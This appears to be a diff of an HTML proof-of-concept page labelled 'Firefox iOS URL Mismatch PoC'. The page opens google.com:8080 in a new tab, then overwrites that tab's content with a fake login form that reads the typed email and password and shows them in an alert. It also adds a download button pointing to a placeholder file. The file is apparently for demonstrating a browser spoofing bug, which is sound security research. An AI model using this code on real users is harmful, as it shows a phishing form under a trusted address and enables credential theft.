@@ -1,37 +1,60 @@
 <!DOCTYPE html>
-<html>
-<body>
-<button onclick="go()">Go</button>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Firefox iOS URL Mismatch PoC</title>
 
 <script>
 function go() {
-    // Step 1: buka about:blank (same-origin)
-    let w = window.open('about:blank', '_blank');
+    // Open trusted URL in new tab
+    var w = window.open('https://www.google.com:8080', '_blank');
 
-    // Step 2: langsung navigate ke trusted domain
-    w.location.href = 'https://www.google.com:8080';
-
-    // Step 3: polling sampai DOM bisa diakses
-    let i = setInterval(() => {
+    // Delay to allow navigation
+    setTimeout(function () {
         try {
-            if (w.document && w.document.body) {
-                clearInterval(i);
+            // Overwrite document content
+            w.document.open();
+            w.document.write(`
+                <h1>Login</h1>
+                Email:<br>
+                <input id="email"><br><br>
+                Password:<br>
+                <input id="pass" type="password"><br><br>
 
-                // Step 4: overwrite DOM
-                w.document.open();
-                w.document.write(`
-                    <h1>Google Login</h1>
-                    <input placeholder="Email"><br>
-                    <input type="password" placeholder="Password"><br>
-                    <button>Login</button>
-                `);
-                w.document.close();
-            }
-        } catch(e) {
-            // expected in normal browsers
+                <button onclick="
+                    alert(
+                        'Email: ' + document.getElementById('email').value +
+                        '\\nPass: ' + document.getElementById('pass').value
+                    )
+                ">
+                    Login
+                </button>
+
+                <br><br>
+
+                <button onclick="downloadFile()">Download Text File</button>
+            `);
+            w.document.close();
+        } catch (e) {
+            console.log('Blocked:', e);
         }
-    }, 50);
+    }, 3000);
+}
+
+// Download helper
+function downloadFile() {
+    const fileUrl = 'https://www.example.com/path/to/your/file.txt';
+
+    var a = document.createElement('a');
+    a.href = fileUrl;
+    a.download = 'file.txt';
+    a.click();
 }
 </script>
+</head>
+
+<body>
+<button onclick="go()">Go</button>
 </body>
 </html>
